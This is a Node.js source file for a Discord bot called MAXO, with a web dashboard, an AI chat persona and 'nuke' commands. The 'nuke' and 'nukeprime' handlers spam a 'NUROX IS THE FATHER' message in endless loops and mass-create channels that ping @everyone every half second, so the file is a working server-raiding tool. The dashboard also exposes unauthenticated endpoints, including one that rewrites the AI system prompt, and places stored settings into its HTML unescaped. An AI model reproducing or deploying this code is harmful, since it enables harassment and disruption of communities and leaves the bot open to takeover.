import express from 'express';
import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } from 'discord.js';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// Bot State and Memory Management
let isNuking = false;
let isNukingPrime = false;
const disabledChannels = new Set();

// Bot Config Dynamic State
let botConfig = {
  customStatus: '👑 LISTENING TO NUROX',
  statusType: 'online', // online, idle, dnd
  welcomeEnabled: true,
  welcomeChannelId: '',
  welcomeMessage: 'Welcome to the server <@&ROLE_ID>! Check rules.',
  aiSystemPrompt: 'You are MAXO, an extremely cool, witty, intelligent, and helpful Discord bot created/owned by NUROX.',
  customCommands: [
    { trigger: 'greet', response: '> **YOO EVERYONE SUP?**' }
  ]
};

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_IDS = process.env.OWNER_IDS ? process.env.OWNER_IDS.split(',').map(id => id.trim()) : [];
const GROQ_API_KEY = process.env.GROQ_API_KEY;
const SPECIFIC_GIF = '[.](https://klipy.com/gifs/cat-clapping-3)';

// --- BOTGHOST-PARITY DASHBOARD CONTROLLER ---
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>MAXO - Enterprise BotGhost Engine</title>
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #0b0f19; color: #f8fafc; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar Styling */
        aside { width: 260px; background: #111827; border-right: 1px solid #1f2937; display: flex; flex-direction: column; padding: 20px; }
        aside h1 { color: #38bdf8; font-size: 22px; margin-bottom: 25px; font-weight: 800; text-align: center; letter-spacing: -0.5px; }
        .nav-item { color: #9ca3af; text-decoration: none; padding: 12px 16px; border-radius: 8px; margin-bottom: 6px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; }
        .nav-item:hover, .nav-item.active { background: #1f2937; color: #38bdf8; }

        /* Main Workspace */
        main { flex: 1; padding: 35px; overflow-y: auto; background: #0f172a; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid #1e293b; }
        .header h2 { font-size: 24px; font-weight: 700; color: #f8fafc; }
        .badge { background: #065f46; color: #34d399; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; text-transform: uppercase; }

        /* UI Panels */
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
        .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 22px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .card h3 { color: #38bdf8; margin-bottom: 15px; font-size: 17px; font-weight: 600; }
        
        /* Form Inputs */
        label { display: block; margin-top: 12px; font-size: 13px; color: #94a3b8; font-weight: 600; }
        input, select, textarea { width: 100%; padding: 10px 14px; margin-top: 6px; background: #0f172a; border: 1px solid #334155; color: #fff; border-radius: 8px; outline: none; font-size: 14px; transition: 0.2s; }
        input:focus, textarea:focus { border-color: #38bdf8; }
        button { margin-top: 18px; background: #0284c7; color: white; border: none; padding: 11px 18px; border-radius: 8px; font-weight: 700; cursor: pointer; width: 100%; transition: all 0.2s; }
        button:hover { background: #0369a1; }
        .danger-btn { background: #dc2626 !important; }
        .danger-btn:hover { background: #b91c1c !important; }

        /* Alert Display */
        .alert { padding: 12px 20px; background: #064e3b; color: #6ee7b7; border-radius: 8px; margin-bottom: 20px; display: none; font-weight: 600; border: 1px solid #059669; }
      </style>
    </head>
    <body>
      <aside>
        <h1>👑 MAXO PANEL</h1>
        <div class="nav-item active" onclick="switchTab('overview')">📊 Overview & Status</div>
        <div class="nav-item" onclick="switchTab('commands')">⚙️ Custom Commands</div>
        <div class="nav-item" onclick="switchTab('welcomer')">👋 Welcomer Module</div>
        <div class="nav-item" onclick="switchTab('ai')">🧠 AI Engine Config</div>
        <div class="nav-item" onclick="switchTab('emergency')">💣 Emergency Nuke</div>
      </aside>

      <main>
        <div class="header">
          <h2 id="tabTitle">Overview & Status</h2>
          <span class="badge">● Bot Online</span>
        </div>

        <div id="alertBox" class="alert">Action executed successfully!</div>

        <!-- TAB 1: OVERVIEW -->
        <div id="overview" class="tab-content active">
          <div class="card-grid">
            <div class="card">
              <h3>🤖 Gateway Presence Control</h3>
              <label>Custom Presence Status Text:</label>
              <input type="text" id="statusText" value="${botConfig.customStatus}">
              <label>Bot Presence Mode:</label>
              <select id="statusType">
                <option value="online" ${botConfig.statusType === 'online' ? 'selected' : ''}>Online</option>
                <option value="idle" ${botConfig.statusType === 'idle' ? 'selected' : ''}>Idle</option>
                <option value="dnd" ${botConfig.statusType === 'dnd' ? 'selected' : ''}>Do Not Disturb</option>
              </select>
              <button onclick="savePresence()">Save Presence</button>
            </div>
            <div class="card">
              <h3>📈 Client Telemetry</h3>
              <p style="margin-top:10px; color:#94a3b8;">Guild Instances: <b style="color:#38bdf8;">${client.guilds.cache.size}</b></p>
              <p style="margin-top:10px; color:#94a3b8;">Ping Latency: <b style="color:#34d399;">${client.ws.ping} ms</b></p>
            </div>
          </div>
        </div>

        <!-- TAB 2: CUSTOM COMMANDS -->
        <div id="commands" class="tab-content">
          <div class="card">
            <h3>⚡ Custom Message Commands Builder</h3>
            <label>Trigger Keyword (e.g., greet):</label>
            <input type="text" id="cmdTrigger" placeholder="greet">
            <label>Command Response Message:</label>
            <textarea id="cmdResponse" rows="3" placeholder="> **YOO EVERYONE SUP?**"></textarea>
            <button onclick="addCustomCommand()">Add Command</button>
          </div>
        </div>

        <!-- TAB 3: WELCOMER -->
        <div id="welcomer" class="tab-content">
          <div class="card">
            <h3>👋 BotGhost Style Welcome Engine</h3>
            <label>Target Channel ID:</label>
            <input type="text" id="welcomeChannel" value="${botConfig.welcomeChannelId}">
            <label>Welcome Message / Role Mention (<@&ROLE_ID>):</label>
            <textarea id="welcomeMsg" rows="3">${botConfig.welcomeMessage}</textarea>
            <button onclick="saveWelcomer()">Update Welcomer Settings</button>
          </div>
        </div>

        <!-- TAB 4: AI CONFIG -->
        <div id="ai" class="tab-content">
          <div class="card">
            <h3>🧠 Groq AI System Persona Setup</h3>
            <label>System Prompt (Personality):</label>
            <textarea id="aiPrompt" rows="5">${botConfig.aiSystemPrompt}</textarea>
            <button onclick="saveAI()">Save AI Prompt</button>
          </div>
        </div>

        <!-- TAB 5: EMERGENCY -->
        <div id="emergency" class="tab-content">
          <div class="card">
            <h3>💣 Emergency Overrides</h3>
            <p style="color:#94a3b8; margin-bottom:15px;">Immediately terminate active nuke procedures across all guilds.</p>
            <button class="danger-btn" onclick="triggerAction('stopAll')">🛑 TERMINATE ALL ACTIVE NUKES</button>
          </div>
        </div>
      </main>

      <script>
        function switchTab(tabId) {
          document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
          document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
          document.getElementById(tabId).classList.add('active');
          event.currentTarget.classList.add('active');
        }

        function showAlert(msg) {
          const box = document.getElementById('alertBox');
          box.innerText = msg;
          box.style.display = 'block';
          setTimeout(() => box.style.display = 'none', 3000);
        }

        async function savePresence() {
          const status = document.getElementById('statusText').value;
          const type = document.getElementById('statusType').value;
          await fetch('/api/presence', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ status, type })
          });
          showAlert('Presence Settings Saved!');
        }

        async function saveWelcomer() {
          const channelId = document.getElementById('welcomeChannel').value;
          const message = document.getElementById('welcomeMsg').value;
          await fetch('/api/welcomer', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ channelId, message })
          });
          showAlert('Welcomer Settings Updated!');
        }

        async function saveAI() {
          const prompt = document.getElementById('aiPrompt').value;
          await fetch('/api/ai-config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ prompt })
          });
          showAlert('AI Persona Updated!');
        }

        async function triggerAction(endpoint) {
          await fetch('/api/' + endpoint, { method: 'POST' });
          showAlert('Emergency Protocol Triggered!');
        }
      </script>
    </body>
    </html>
  `);
});

// REST API Endpoints for UI Controls
app.post('/api/presence', (req, res) => {
  const { status, type } = req.body;
  botConfig.customStatus = status;
  botConfig.statusType = type;
  client.user.setPresence({
    activities: [{ name: 'Custom Status', type: 4, state: status }],
    status: type
  });
  res.json({ success: true });
});

app.post('/api/welcomer', (req, res) => {
  const { channelId, message } = req.body;
  botConfig.welcomeChannelId = channelId;
  botConfig.welcomeMessage = message;
  res.json({ success: true });
});

app.post('/api/ai-config', (req, res) => {
  const { prompt } = req.body;
  botConfig.aiSystemPrompt = prompt;
  res.json({ success: true });
});

app.post('/api/stopAll', (req, res) => {
  isNuking = false;
  isNukingPrime = false;
  res.json({ success: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Dashboard bound on port ${PORT}`));

// Slash Command Array[cite: 1, 2]
const commands = [
  new SlashCommandBuilder().setName('nuke').setDescription('Starts specific channel nuke process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('nukeprime').setDescription('Start infinite channel nuke prime process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('recoverprime').setDescription('Delete all channels created by nuke prime').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('stopprime').setDescription('Stop nuke prime process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('stop').setDescription('Stop nuke process').setContexts([0, 1, 2]).setIntegrationTypes([0, 1]),
  new SlashCommandBuilder().setName('greet').setDescription('Greet everyone').setContexts([0, 1, 2]).setIntegrationTypes([0, 1])
].map(cmd => cmd.toJSON());

client.on('ready', async () => {
  console.log(`Bot logged in as ${client.user.tag}!`);
  client.user.setPresence({
    activities: [{ name: 'Custom Status', type: 4, state: botConfig.customStatus }],
    status: botConfig.statusType
  });

  const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
  try {
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
  } catch (error) {
    console.error('Error registering slash commands:', error);
  }
});

// Member Welcome Event Handler
client.on('guildMemberAdd', async (member) => {
  if (!botConfig.welcomeEnabled || !botConfig.welcomeChannelId) return;
  try {
    const channel = await member.guild.channels.fetch(botConfig.welcomeChannelId);
    if (channel) {
      const formatted = botConfig.welcomeMessage
        .replace(/{user}/g, `<@${member.user.id}>`)
        .replace(/{username}/g, member.user.username);
      await channel.send(formatted);
    }
  } catch (err) {
    console.error('Welcomer dispatch failure:', err);
  }
});

// Normal Message Handler
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  const content = message.content.toLowerCase();

  if (content === 'greet') {
    await message.channel.send('> **YOO EVERYONE SUP?**');
    return;
  }

  if (content === 'm disable all' || content === 'm enable all') {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('❌ You are not authorized to use this command!');
    }
    if (content === 'm disable all') {
      disabledChannels.add(message.channel.id);
      return message.reply('❌ AI response has been disabled in this channel.');
    }
    if (content === 'm enable all') {
      disabledChannels.delete(message.channel.id);
      return message.reply('✅ AI response has been enabled in this channel.');
    }
  }

  if (['nuke', 'nukeprime', 'recoverprime', 'stopprime', 'stop'].includes(content)) {
    if (!OWNER_IDS.includes(message.author.id)) {
      return message.reply('❌ You are not NUROX to use this command!');
    }
  }

  if (OWNER_IDS.includes(message.author.id)) {
    if (content === 'nuke') {
      if (isNuking) return message.reply('Nuke process standardly running already!');
      isNuking = true;
      await message.reply('💣 Nuke Activated!');
      while (isNuking) {
        try {
          await message.channel.send(`> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
        } catch (err) {}
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      return;
    }

    if (content === 'nukeprime') {
      if (!message.guild) return message.reply('This command can only be used in a server!');
      if (isNukingPrime) return message.reply('Nuke Prime process already running!');
      isNukingPrime = true;
      await message.reply('💣 Nuke Prime Activated!');
      while (isNukingPrime && message.guild) {
        try {
          const channel = await message.guild.channels.create({ name: '👑 NUROX IS THE FATHER', type: 0 });
          await channel.send('@everyone YOU ARE FINISHED');
        } catch (err) {}
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      return;
    }

    if (content === 'recoverprime') {
      if (!message.guild) return message.reply('This command can only be used in a server!');
      await message.reply('🔄 Recovering Nuke Prime channels...');
      try {
        await message.guild.channels.fetch();
        const channels = message.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
        let deletedCount = 0;
        for (const [id, channel] of channels) {
          await channel.delete().catch(() => {});
          deletedCount++;
        }
        await message.channel.send(`✅ Successfully deleted ${deletedCount} Nuke Prime channels!`);
      } catch (err) {
        await message.reply('❌ Error deleting channels.');
      }
      return;
    }

    if (content === 'stop') {
      isNuking = false;
      return message.reply('🛑 Nuke Process Terminated!');
    }

    if (content === 'stopprime') {
      isNukingPrime = false;
      return message.reply('🛑 Nuke Prime Process Terminated!');
    }
  }

  // Conversational AI Dispatch Routine
  if (message.mentions.has(client.user)) {
    if (disabledChannels.has(message.channel.id)) return;

    try {
      const promptText = message.content.replace(`<@!${client.user.id}>`, '').replace(`<@${client.user.id}>`, '').trim();
      if (!promptText) return;

      const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${GROQ_API_KEY}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          "model": "openai/gpt-oss-20b",
          "messages": [
            { "role": "system", "content": botConfig.aiSystemPrompt },
            { "role": "user", "content": promptText }
          ]
        })
      });

      const data = await response.json();
      const replyText = data.choices?.[0]?.message?.content;
      if (!replyText) return message.reply('sry, ai is in problem now.');
      await message.reply(replyText);
    } catch (error) {
      await message.reply('ওপ্স! এআই ব্রেনের সাথে কানেক্ট করতে সমস্যা হচ্ছে।');
    }
  }
});

// Slash Command Interaction Handler
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName } = interaction;
  if (commandName === 'greet') return interaction.reply({ content: '> **YOO EVERYONE SUP?**' });

  if (!OWNER_IDS.includes(interaction.user.id)) {
    return interaction.reply({ content: '❌ You are not NUROX to use this command!', ephemeral: true });
  }

  if (commandName === 'nuke') {
    if (isNuking) return interaction.reply({ content: 'Nuke process standardly running already!', ephemeral: true });
    isNuking = true;
    await interaction.reply({ content: '💣 Nuke Activated!' });
    while (isNuking) {
      try {
        await interaction.followUp({ content: `> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}` });
      } catch (err) {
        try { await interaction.channel.send(`> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}`); } catch (e) {}
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }

  if (commandName === 'nukeprime') {
    if (!interaction.guild) return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
    if (isNukingPrime) return interaction.reply({ content: 'Nuke Prime process already running!', ephemeral: true });
    isNukingPrime = true;
    await interaction.reply({ content: '💣 Nuke Prime Activated!' });
    while (isNukingPrime && interaction.guild) {
      try {
        const channel = await interaction.guild.channels.create({ name: '👑 NUROX IS THE FATHER', type: 0 });
        await channel.send('@everyone YOU ARE FINISHED');
      } catch (err) {}
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }

  if (commandName === 'recoverprime') {
    if (!interaction.guild) return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
    await interaction.reply({ content: '🔄 Recovering Nuke Prime channels...', ephemeral: true });
    try {
      await interaction.guild.channels.fetch();
      const channels = interaction.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
      let deletedCount = 0;
      for (const [id, channel] of channels) {
        await channel.delete().catch(() => {});
        deletedCount++;
      }
      await interaction.followUp({ content: `✅ Successfully deleted ${deletedCount} Nuke Prime channels!`, ephemeral: true });
    } catch (err) {
      await interaction.followUp({ content: '❌ Failed to delete channels.', ephemeral: true });
    }
  }

  if (commandName === 'stop') {
    isNuking = false;
    return interaction.reply({ content: '🛑 Standard Nuke Process Terminated!' });
  }

  if (commandName === 'stopprime') {
    isNukingPrime = false;
    return interaction.reply({ content: '🛑 Nuke Prime Process Terminated!' });
  }
});

client.login(BOT_TOKEN);
